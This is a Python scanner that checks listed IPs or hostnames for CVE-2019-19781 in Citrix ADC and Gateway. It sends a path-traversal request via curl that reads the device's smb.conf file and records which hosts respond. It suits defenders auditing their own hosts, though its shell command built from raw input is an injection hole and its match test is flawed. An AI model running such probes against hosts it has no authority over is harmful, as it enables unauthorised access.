#!/usr/bin/env python

import subprocess
import socket
import argparse
from argparse import RawTextHelpFormatter

ips = []
ip_count = 0
hit_count = 0
results = []

# Function to load IPs and FQDNs from Input File


def get_ip_from_txt(filename):
    global ips
    with open(filename, 'r') as f:
        lines = f.readlines()
        for line in lines:
            line = line.strip()
            ips.append(line)

# Function to check for valid IP or valid Host


def check_valid_host(ip):
    try:
        socket.getaddrinfo(ip, 443, 0, 0, socket.IPPROTO_TCP)
    except BaseException:
        return False
    return True

# Function to check exploitability against CVE-2019-19781


def send_vpn_requests():
    global ip_count
    global hit_count
    global ips
    global results

    for ip in ips:
        if check_valid_host(ip):
            pass
        else:
            print("Host Invalid: {}".format(str(ip)))
            continue
        ip_count = ip_count + 1
        cmd = "curl -m 3 -k -X GET --path-as-is https://" + \
            ip + "/vpn/../t/../vpns/./cfg/smb.conf" + " 2>&1"
        try:
            response = ""
            response = subprocess.check_output(cmd, shell=True)
            if ("[global]") and ("encrypt passwords") and(
                    "name resolve order") in str(response):
                hit_count += 1
                results.append(ip)
        except subprocess.CalledProcessError:
            print("IP address unreachable: {}".format(str(ip)))


if __name__ == "__main__":
    # Parsing Command Line Arguments
    parser = argparse.ArgumentParser(
        description='Tool to scan ADC and Gateway for CVE-2019-19781 exploitability.\nVersion 1.0',
        formatter_class=RawTextHelpFormatter)
    parser.add_argument(
        '--in_file',
        help='Input file with list of IPs and/or FQDNs, one per line.',
        dest='ip_file',
        required="True")
    parser.add_argument(
        '--out_file',
        help='Output file containing vulnerable IPs and FQDNs.',
        dest='output_file',
        required=True)
    args = parser.parse_args()

    # Read input file for list of IP Addresses or FQDNs
    ip_file = args.ip_file
    output_file = args.output_file
    get_ip_from_txt(ip_file)

    # Test exploitability for CVE-2019-19781
    send_vpn_requests()

    # Publish results in Output File
    print(
        "Out of {} IP addresses, {} found to be vulnerable".format(
            ip_count,
            hit_count))
    print("Writing output to {} ".format(output_file))
    with open(output_file, 'a') as out:
        for result in results:
            out.write("{}\n".format(result))
